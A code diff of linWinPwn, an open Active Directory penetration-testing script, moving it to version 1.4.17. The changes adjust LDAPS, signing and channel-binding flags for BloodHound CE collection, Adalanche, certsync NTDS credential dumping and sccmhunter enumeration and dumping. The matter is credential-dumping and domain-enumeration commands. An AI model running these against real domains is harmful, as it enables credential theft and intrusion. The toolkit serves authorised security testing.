@@ -184,7 +184,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.16 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.17 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -1392,8 +1392,8 @@ bhdce_enum() {
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/BloodHoundCE_${user_var}" || exit
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
-            if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--ldap-channel-binding"; else ldapbind_param=""; fi
-            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} ${ldapbind_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_${dc_domain}.txt"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} ${ldaps_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
             jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_users.json 2>/dev/null | sort -uf > "${Users_dir}/users_list_bhdce_${user_var}.txt"
             jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_computers.json 2>/dev/null | sort -uf > "${Servers_dir}/servers_list_bhdce_${user_var}.txt"
@@ -1427,8 +1427,8 @@ bhdce_enum_dconly() {
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/BloodHoundCE_${user_var}" || exit
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
-            if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--ldap-channel-binding"; else ldapbind_param=""; fi
-            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} ${ldapbind_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+            run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} ${ldaps_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
             cd "${current_dir}" || exit
             jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null | sort -uf > "${Users_dir}/users_list_bhdce_${user_out}_${dc_domain}.txt"
             jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_computers.json 2>/dev/null | sort -uf > "${Servers_dir}/servers_list_bhdce_${user_out}_${dc_domain}.txt"
@@ -1920,7 +1920,8 @@ adalanche_enum() {
             current_dir=$(pwd)
             cd "${DomainRecon_dir}/Adalanche" || exit
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--tlsmode tls --ignorecert"; else ldaps_param="--tlsmode NoTLS --port 389"; fi
-            run_command "${adalanche} ${adalanche_verbose} collect activedirectory ${argument_adalanche} --domain ${dc_domain} --server ${dc_ip} ${ldaps_bool}" | tee "${DomainRecon_dir}/Adalanche/adalanche_output_${dc_domain}.txt"
+            if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="--channelbinding=false"; fi
+            run_command "${adalanche} ${adalanche_verbose} collect activedirectory ${argument_adalanche} --domain ${dc_domain} --server ${dc_ip} ${ldaps_param} ${ldapbind_param}" | tee "${DomainRecon_dir}/Adalanche/adalanche_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
         fi
     fi
@@ -2628,7 +2629,7 @@ certsync_ntds_dump() {
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] certsync requires credentials${NC}"
         else
-            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
+            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
             run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} ${dnstcp_param} -ns ${dns_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${Credentials_dir}/certsync_${user_var}.txt"
         fi
@@ -2652,8 +2653,10 @@ sccmhunter_enum() {
             echo -e "${PURPLE}[-] sccmhunter requires credentials${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
+            if [ "${ldapsign_bool}" == true ] && [ "${ldaps_bool}" == false ]; then ldapsign_param="-signing"; else ldapsign_param=""; fi
+            if [ "${ldapbind_bool}" == true ]; then ldapbind_param="-binding"; else ldapbind_param=""; fi
             rm -rf "$HOME/.sccmhunter/logs/" 2>/dev/null
-            run_command "${python3} ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
+            run_command "${python3} ${sccmhunter} find ${argument_sccm} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -dc-ip ${dc_ip}" 2>&1 | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
             run_command "${python3} ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save" 2>&1 | tee "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
             if ! grep -q 'SCCM doesn' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt" && ! grep -q 'Traceback' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"; then
                 run_command "${python3} ${sccmhunter} show -users" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
@@ -2675,8 +2678,10 @@ sccmhunter_dump() {
             echo -e "${PURPLE}[-] sccmhunter requires credentials${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
+            if [ "${ldapsign_bool}" == true ] && [ "${ldaps_bool}" == false ]; then ldapsign_param="-signing"; else ldapsign_param=""; fi
+            if [ "${ldapbind_bool}" == true ]; then ldapbind_param="-binding"; else ldapbind_param=""; fi
             if ! grep -q 'SCCM doesn' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt" && ! grep -q 'Traceback' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"; then
-                run_command "${python3} ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_dump_output_${dc_domain}.txt"
+                run_command "${python3} ${sccmhunter} http ${argument_sccm} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -dc-ip ${dc_ip} -auto" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_dump_output_${dc_domain}.txt"
             else
                 echo -e "${PURPLE}[-] No SCCM servers found! Please re-run SCCM enumeration using sccmhunter and try again..${NC}"
             fi
@@ -8174,7 +8179,7 @@ auth_menu() {
                         for pki_server in $pki_servers; do
                             i=$((i + 1))
                             pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
-                        if [ "${ldaps_bool}" == true ]; then ldaps_param="" else ldaps_param="-ldap-scheme ldap"; fi
+                        if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
                         if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
                         if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
                             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
